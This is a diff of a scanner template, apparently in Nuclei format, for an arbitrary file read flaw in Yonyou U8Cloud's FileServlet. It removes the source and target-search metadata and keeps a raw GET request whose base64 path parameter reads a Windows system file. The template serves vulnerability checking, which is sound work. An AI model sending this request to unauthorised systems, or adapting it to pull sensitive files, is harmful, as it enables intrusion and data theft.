@@ -3,12 +3,8 @@ info:
   name: 用友U8Cloud-FileServlet 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zsdqaz6uei8vmxqk'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zsdqaz6uei8vmxqk
-    fofa: app="用友-U8-Cloud"
 http:
 - raw:
   - 'GET /service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ== HTTP/1.1
